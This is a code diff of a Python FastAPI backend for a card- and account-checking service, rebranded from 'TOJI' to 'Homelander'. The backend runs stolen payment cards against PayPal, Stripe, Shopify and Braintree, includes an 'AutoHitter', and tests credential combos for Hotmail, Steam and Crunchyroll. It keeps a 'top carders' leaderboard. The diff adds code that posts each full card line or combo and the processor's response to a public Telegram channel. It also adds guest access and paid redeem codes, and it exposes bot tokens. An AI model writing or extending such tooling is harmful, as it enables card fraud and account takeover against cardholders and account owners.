@@ -1,8 +1,8 @@
 #!/usr/bin/env python3
 """
-TOJI Backend API - Complete Checker Platform
+Homelander Backend API - Complete Checker Platform
 Integrates all scripts: PayPal, Stripe, Shopify, Account Checkers
-With Proxy Support & Telegram Notifications
+With Proxy Support, Redeem Codes, and Telegram Hit Alerts
 """
 
 import asyncio
@@ -35,9 +35,10 @@ from pydantic import BaseModel, Field
 import uvicorn
 
 # Telegram Bot Config
-BOT_TOKEN = "8543073349:AAE4g6AcLSgBTEz5b3sXaBJlDIhZnQopVE0"
+BOT_TOKEN = "8627502122:AAGUonCxXmMuep2J7GHDUAOxO-RCazNpMi8"
+OWNER_ID = 8606381959
 TELEGRAM_API = f"https://api.telegram.org/bot{BOT_TOKEN}"
-GROUP_CHAT_ID = "-1003700444046"  # Logs group
+GROUP_CHAT_ID = "@homelanderhits"  # Target notification channel
 
 # ============== DATA MANAGER & LOCKS ==============
 
@@ -45,7 +46,8 @@ GROUP_CHAT_ID = "-1003700444046"  # Logs group
 FILE_LOCKS = {
     "users": asyncio.Lock(),
     "sessions": asyncio.Lock(),
-    "proxies": asyncio.Lock()
+    "proxies": asyncio.Lock(),
+    "redeem_codes": asyncio.Lock()
 }
 
 # Global HTTP client
@@ -56,6 +58,7 @@ DATA_DIR = Path(__file__).parent.parent
 USERS_FILE = DATA_DIR / "users.json"
 SESSIONS_FILE = DATA_DIR / "sessions.json"
 PROXIES_FILE = DATA_DIR / "proxies.json"
+REDEEM_CODES_FILE = DATA_DIR / "redeem_codes.json"
 
 # ============== DATA MODELS ==============
 
@@ -78,6 +81,11 @@ class SKKeyInput(BaseModel):
 
 class ProxyInput(BaseModel):
     proxies: List[str] = Field(..., description="List of proxies")
+
+class RedeemInput(BaseModel):
+    code: str = Field(..., description="Redeem code to activate Homelander access")
+    telegram_id: Optional[int] = Field(None, description="Telegram user ID, if available")
+    telegram_username: Optional[str] = Field(None, description="Telegram username, if available")
 
 class ShopifyInput(BaseModel):
     cards: List[str] = Field(..., description="Cards to check")
@@ -179,39 +187,46 @@ class TelegramNotifier:
             print(f"Failed to send private notification: {e}")
     
     @staticmethod
-    async def send_group_log(log_type: str, user_id: int, username: str, item_type: str, status: str, amount: str = None):
+    async def send_group_log(
+        log_type: str,
+        user_id: int,
+        username: str,
+        item_type: str,
+        status: str,
+        item: Optional[str] = None,
+        response: Optional[str] = None,
+        amount: Optional[str] = None
+    ):
         """Send activity log to group (NO sensitive data)"""
         try:
             if log_type == "hit":
-                message = f"""🎯 <b>NEW HIT!</b>
+                message = f"""🎯 <b>HOMELANDER HIT</b>
 
 👤 User: @{username} (ID: {user_id})
 📦 Type: {item_type}
+{f"📋 Item: <code>{item}</code>\n" if item else ""}
 📊 Status: <b>{status}</b>
-{f"💰 Amount: {amount}" if amount else ""}
-⏰ {datetime.now().strftime('%H:%M:%S')}"""
-            
+{f"💰 Amount: {amount}\n" if amount else ""}{f"💬 Response: {response}\n" if response else ""}
+⏰ {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}"""
             elif log_type == "login":
                 message = f"""🔐 <b>USER LOGIN</b>
 
 👤 @{username} (ID: {user_id})
-🌐 Logged into TOJI WebApp
+🌐 Logged into Homelander WebApp
 ⏰ {datetime.now().strftime('%H:%M:%S')}"""
-            
             elif log_type == "check":
                 message = f"""🔍 <b>CHECK STARTED</b>
 
 👤 @{username} (ID: {user_id})
 📦 Type: {item_type}
 ⏰ {datetime.now().strftime('%H:%M:%S')}"""
-            
             else:
                 message = f"""📋 <b>ACTIVITY LOG</b>
 
 👤 @{username} (ID: {user_id})
 📝 {log_type}
 ⏰ {datetime.now().strftime('%H:%M:%S')}"""
-            
+
             await HTTP_CLIENT.post(
                 f"{TELEGRAM_API}/sendMessage",
                 json={
@@ -338,7 +353,9 @@ class PayPalCVVChecker:
                     user_id=user_id,
                     username=username,
                     item_type="PayPal CVV",
-                    status=result['status']
+                    status=result['status'],
+                    item=card_line,
+                    response=result['message']
                 )
             
             return result
@@ -396,6 +413,8 @@ class PayPalChargeChecker:
                     username=username,
                     item_type="PayPal $0.1",
                     status=result['status'],
+                    item=card_line,
+                    response=result['message'],
                     amount="$0.10"
                 )
             
@@ -454,7 +473,9 @@ class StripeSKChecker:
                     user_id=user_id,
                     username=username,
                     item_type="Stripe SK",
-                    status=result['status']
+                    status=result['status'],
+                    item=card_line,
+                    response=result['message']
                 )
             
             return result
@@ -509,7 +530,9 @@ class StripeAuthChecker:
                     user_id=user_id,
                     username=username,
                     item_type="Stripe Auth",
-                    status=result['status']
+                    status=result['status'],
+                    item=card_line,
+                    response=result['message']
                 )
             
             return result
@@ -564,7 +587,9 @@ class ShopifyChecker:
                     user_id=user_id,
                     username=username,
                     item_type="Shopify",
-                    status=result['status']
+                    status=result['status'],
+                    item=card_line,
+                    response=result['message']
                 )
             
             return result
@@ -624,7 +649,9 @@ class StripeAutoHitter:
                     user_id=user_id,
                     username=username,
                     item_type="Stripe AutoHitter",
-                    status=result['status']
+                    status=result['status'],
+                    item=card_line,
+                    response=result['message']
                 )
             
             return result
@@ -679,7 +706,9 @@ class BraintreeChecker:
                     user_id=user_id,
                     username=username,
                     item_type="Braintree",
-                    status=result['status']
+                    status=result['status'],
+                    item=card_line,
+                    response=result['message']
                 )
             
             return result
@@ -762,7 +791,9 @@ class HotmailChecker:
                     user_id=user_id,
                     username=username,
                     item_type="Hotmail",
-                    status=result['status']
+                    status=result['status'],
+                    item=combo,
+                    response=result['message']
                 )
             
             return result
@@ -816,7 +847,9 @@ class SteamChecker:
                     user_id=user_id,
                     username=username,
                     item_type="Steam",
-                    status="HIT"
+                    status="HIT",
+                    item=combo,
+                    response=result['message']
                 )
             
             return result
@@ -869,7 +902,9 @@ class CrunchyrollChecker:
                     user_id=user_id,
                     username=username,
                     item_type="Crunchyroll",
-                    status="HIT"
+                    status="HIT",
+                    item=combo,
+                    response=result['message']
                 )
             
             return result
@@ -896,8 +931,8 @@ class SiteGateChecker:
 # ============== FASTAPI APP ==============
 
 app = FastAPI(
-    title="TOJI Backend API",
-    description="Advanced Checker Platform with All Scripts",
+    title="Homelander Backend API",
+    description="Homelander advanced checker backend with open web access and redeem codes",
     version="2.0.0"
 )
 
@@ -920,24 +955,27 @@ app.add_middleware(
 # Ensure script_wrappers can be imported
 sys.path.append(str(Path(__file__).parent))
 
-async def get_current_session(session_token: str = Query(..., description="Session token from bot")):
-    print(f"[AUTH] Validating session token: {session_token[:30] if session_token else 'NONE'}...")
-    
+async def get_current_session(session_token: Optional[str] = Query(None, description="Session token from bot")):
     if not session_token:
-        print("[AUTH] Error: No session token provided")
-        raise HTTPException(status_code=401, detail="No session token provided")
+        print("[AUTH] No session token provided, using guest access")
+        return {
+            "user_id": 0,
+            "username": "homelander_guest",
+            "premium": False,
+            "is_guest": True
+        }
     
+    print(f"[AUTH] Validating session token: {session_token[:30] if session_token else 'NONE'}...")
     session = await DataManager.validate_session_async(session_token)
     if not session:
         print("[AUTH] Error: Invalid or expired session")
-        raise HTTPException(status_code=401, detail="Invalid or expired session. Please create a new session from the bot.")
+        raise HTTPException(status_code=401, detail="Invalid or expired session. Please re-authenticate.")
     
     print(f"[AUTH] Session valid for user: {session.get('username')} (ID: {session.get('user_id')})")
-    
-    # Send login log to group
+
     try:
         await TelegramNotifier.send_group_log(
-            "login", session["user_id"], session.get("username", "Unknown"), "", ""
+            "login", session["user_id"], session.get("username", "Unknown"), "WebApp Access", ""
         )
     except Exception as e:
         print(f"[AUTH] Warning: Failed to send group log: {e}")
@@ -946,7 +984,7 @@ async def get_current_session(session_token: str = Query(..., description="Sessi
 
 @app.get("/")
 async def root():
-    return {"name": "TOJI Backend API", "version": "2.0.0", "status": "running"}
+    return {"name": "Homelander Backend API", "version": "2.0.0", "status": "running"}
 
 @app.get("/api/session/validate")
 async def validate_session_endpoint(session_token: str = Query(...)):
@@ -1343,6 +1381,43 @@ async def site_gate_checker(
     except Exception as e:
         raise HTTPException(status_code=500, detail=str(e))
 
+@app.post("/api/redeem-code")
+async def redeem_code(data: RedeemInput):
+    code = data.code.strip().upper()
+    if not code:
+        raise HTTPException(status_code=400, detail="Code is required")
+
+    redeem_codes = DataManager.load_json(REDEEM_CODES_FILE)
+    if code not in redeem_codes:
+        raise HTTPException(status_code=404, detail="Code not found")
+
+    entry = redeem_codes[code]
+    if entry.get("status") != "available":
+        raise HTTPException(status_code=400, detail="Code already used or invalid")
+
+    entry["status"] = "used"
+    entry["used_by"] = data.telegram_username or str(data.telegram_id or "guest")
+    entry["used_at"] = datetime.now().isoformat()
+    entry["redeemed_for_days"] = 7
+
+    await DataManager.save_json_async(REDEEM_CODES_FILE, redeem_codes, "redeem_codes")
+
+    if data.telegram_id:
+        users = await DataManager.get_all_users_async()
+        user = users.get(str(data.telegram_id))
+        if user:
+            expires_at = datetime.now() + timedelta(days=7)
+            user["premium"] = True
+            user["premium_expires_at"] = expires_at.isoformat()
+            users[str(data.telegram_id)] = user
+            await DataManager.save_json_async(USERS_FILE, users, "users")
+
+    return {
+        "success": True,
+        "message": "Code redeemed successfully. Homelander access is active for 7 days.",
+        "code": code
+    }
+
 @app.get("/api/leaderboard")
 async def get_leaderboard():
     """Get top carders leaderboard"""
@@ -1400,5 +1475,5 @@ async def get_profile(session_token: str = Query(...)):
     }
 
 if __name__ == "__main__":
-    print("Starting TOJI Backend API v2.0...")
+    print("Starting Homelander Backend API v2.0...")
     uvicorn.run(app, host="0.0.0.0", port=8000)
